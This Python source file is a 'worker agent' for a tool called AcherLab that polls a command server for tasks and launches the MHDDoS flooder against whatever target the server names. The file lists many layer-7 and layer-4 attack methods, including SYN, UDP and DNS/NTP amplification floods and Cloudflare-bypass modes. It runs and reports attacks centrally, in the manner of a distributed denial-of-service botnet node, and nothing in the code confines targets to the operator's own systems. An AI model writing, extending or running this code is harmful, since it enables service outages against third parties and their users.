#!/usr/bin/env python3
"""
AcherLab Stress Tool - Worker Agent v2
Multi-worker task queue model.
"""

import os, sys, json, time, threading, subprocess, re, requests, platform
from datetime import datetime

SERVER_URL = os.environ.get("SERVER_URL", "http://localhost:5000")
TOKEN = os.environ.get("WORKER_TOKEN", "")
WORKER_ID = os.environ.get("WORKER_ID", platform.node() or "worker-unknown")
POLL_INTERVAL = int(os.environ.get("POLL_INTERVAL", "2"))
MHDDOS_DIR = os.environ.get("MHDDOS_DIR", os.path.join(os.path.dirname(__file__), "..", "MHDDoS"))

attack_process = None
attack_start_time = None
current_task_id = None
stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": False, "uptime": "00:00:00"}
logs = []
prev_idle = 0
prev_total = 0
prev_req = 0
prev_req_time = 0

def get_cpu_pct():
    global prev_idle, prev_total
    try:
        with open("/proc/stat") as f:
            line = f.readline()
        parts = line.split()
        idle = int(parts[4])
        total = sum(int(p) for p in parts[1:])
        if prev_total:
            dt = total - prev_total
            di = idle - prev_idle
            pct = round((1 - di / max(dt, 1)) * 100, 1)
        else:
            pct = 0
        prev_idle, prev_total = idle, total
        return pct
    except:
        return 0

def get_mem_pct():
    try:
        r = subprocess.run("free -m | awk 'NR==2{printf \"%.1f\", $3*100/$2}'", shell=True, capture_output=True, text=True, timeout=3)
        return float(r.stdout.strip()) if r.stdout.strip() else 0
    except:
        return 0

def get_cpu_info():
    try:
        with open("/proc/cpuinfo") as f:
            text = f.read()
        model = "N/A"
        for line in text.split("\n"):
            if "model name" in line:
                model = line.split(":")[1].strip()
                break
        cores = 0
        for line in text.split("\n"):
            if "cpu cores" in line:
                cores = int(line.split(":")[1].strip())
                break
        count = text.count("processor\t:")
        return {"model": model, "cores": cores or count, "threads": count or 1}
    except:
        return {"model": "Unknown", "cores": 1, "threads": 1}

def parse_mhd_output(line):
    global stats, logs
    text = line.rstrip()
    logs.append(text)
    if len(logs) > 2000:
        logs[:] = logs[-2000:]
    m = re.search(r"Sent:\s*([\d,]+)", line)
    if m:
        stats["requests"] = int(m.group(1).replace(",", ""))
        stats["running"] = True

def monitor_mhd_output(proc):
    global stats
    for line in iter(proc.stdout.readline, ""):
        if not line: break
        parse_mhd_output(line.rstrip())
    proc.wait()
    stats["running"] = False

def run_attack(task):
    global attack_process, attack_start_time, stats, logs, current_task_id, prev_req, prev_req_time
    if attack_process and attack_process.poll() is None:
        return {"error": "Already running"}
    target = task.get("target", "")
    method = task.get("method", "GET")
    threads = str(task.get("threads", 100))
    duration = str(task.get("duration", 60))
    proxy_type = str(task.get("proxy_type", 0))
    rpc = str(task.get("rpc", 10))

    logs = []
    stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": True, "uptime": "00:00:00"}
    prev_req = 0
    prev_req_time = time.time()
    attack_start_time = prev_req_time
    current_task_id = task.get("id")

    start_py = os.path.join(MHDDOS_DIR, "start.py")
    if not os.path.exists(start_py):
        logs.append(f"[ERROR] MHDDoS not found at {start_py}")
        return {"error": f"MHDDoS not found at {start_py}"}

    layer7 = ["GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW","HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE","XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR"]
    layer4 = ["TCP","UDP","SYN","CPS","CONNECTION","VSE","TS3","FIVEM","FIVEM-TOKEN","MINECRAFT","MCBOT","MCPE","MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP"]

    proc_args = ["python3", "-u", start_py]
    if method in layer7:
        proc_args += [method, target, proxy_type, threads, "http.txt", rpc, duration]
    elif method in layer4:
        from urllib.parse import urlparse
        parsed = urlparse(target)
        host = parsed.hostname or target
        port = parsed.port or 80
        proc_args += [method, f"{host}:{port}", threads, duration]
    else:
        logs.append(f"[ERROR] Unknown method: {method}")
        return {"error": f"Unknown method: {method}"}

    env = os.environ.copy()
    env["PYTHONWARNINGS"] = "ignore"
    try:
        attack_process = subprocess.Popen(proc_args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True, cwd=MHDDOS_DIR, env=env)
        threading.Thread(target=monitor_mhd_output, args=(attack_process,), daemon=True).start()
        logs.append(f"[START] {method} -> {target} | threads={threads} duration={duration}s")
        return {"message": f"Attack started: {method}"}
    except Exception as e:
        logs.append(f"[ERROR] Failed to start: {e}")
        return {"error": str(e)}

def stop_attack():
    global attack_process, stats, current_task_id
    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        try: attack_process.wait(timeout=5)
        except: attack_process.kill()
    stats["running"] = False
    stats["rate"] = 0
    logs.append("[STOP] Attack stopped")
    current_task_id = None
    return {"message": "Stopped"}

def send_headers():
    return {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

def worker_loop():
    global stats, logs, prev_req, prev_req_time, current_task_id
    cpu_info = get_cpu_info()
    print(f"[WORKER] ID: {WORKER_ID}")
    print(f"[WORKER] Server: {SERVER_URL}")
    print(f"[WORKER] CPU: {cpu_info['model']} ({cpu_info['cores']}c/{cpu_info['threads']}t)")

    while True:
        try:
            r = requests.get(f"{SERVER_URL}/api/worker/ping?worker_id={WORKER_ID}", headers=send_headers(), timeout=10)
            if r.status_code == 200:
                data = r.json()
                task = data.get("task")
                if task and current_task_id is None:
                    print(f"[TASK] Received task #{task['id']}: {task['method']} -> {task['target']}")
                    run_attack(task)
                elif task and current_task_id is not None:
                    pass

            uptime = "00:00:00"
            if attack_start_time:
                el = int(time.time() - attack_start_time)
                uptime = f"{el//3600:02d}:{(el%3600)//60:02d}:{el%60:02d}"
            stats["uptime"] = uptime
            stats["cpu"] = get_cpu_pct()
            stats["memory"] = get_mem_pct()

            now = time.time()
            if prev_req_time and stats["running"]:
                dr = stats["requests"] - prev_req
                dt = now - prev_req_time
                stats["rate"] = round(dr / max(dt, 0.1), 1) if dt > 0 else 0
                stats["success"] = stats["requests"]
            else:
                stats["rate"] = 0
            prev_req = stats["requests"]
            prev_req_time = now

            payload = {
                "version": "1.0",
                "worker_id": WORKER_ID,
                "cpu_info": cpu_info,
                "stats": dict(stats),
                "logs": logs[-10:] if logs else [],
                "current_task": current_task_id,
            }
            resp = requests.post(f"{SERVER_URL}/api/worker/stats?worker_id={WORKER_ID}", json=payload, headers=send_headers(), timeout=10)
            if resp.status_code == 200:
                result = resp.json()
                if result.get("stop"):
                    print(f"[CMD] Server requested stop")
                    stop_attack()

        except requests.ConnectionError:
            pass
        except Exception as e:
            print(f"[WORKER] Error: {e}")

        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    if not TOKEN:
        print("[ERROR] WORKER_TOKEN required")
        sys.exit(1)
    print(f"AcherLab Worker Agent v2 starting...")
    worker_loop()
